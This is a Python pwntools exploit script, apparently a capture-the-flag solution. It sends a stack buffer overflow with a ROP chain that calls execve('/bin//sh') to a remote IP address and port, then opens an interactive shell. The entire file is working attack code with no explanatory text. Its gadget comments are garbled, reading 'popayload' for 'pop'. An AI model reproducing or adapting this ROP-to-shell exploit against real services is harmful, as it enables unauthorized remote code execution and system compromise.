#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack
from pwn import *

# Padding goes here
payload = 'admin\x00'.ljust(0x40+8,'A')

payload += pack('<Q', 0x0000000000410193) # popayload rsi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x0000000000415544) # popayload rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x000000000047f321) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000410193) # popayload rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444aa0) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000047f321) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000400686) # popayload rdi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x0000000000410193) # popayload rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000449765) # popayload rdx ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444aa0) # xor rax, rax ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000040123c) # syscall

p = remote('35.186.153.116', 7002)
p.sendline(payload)
p.interactive()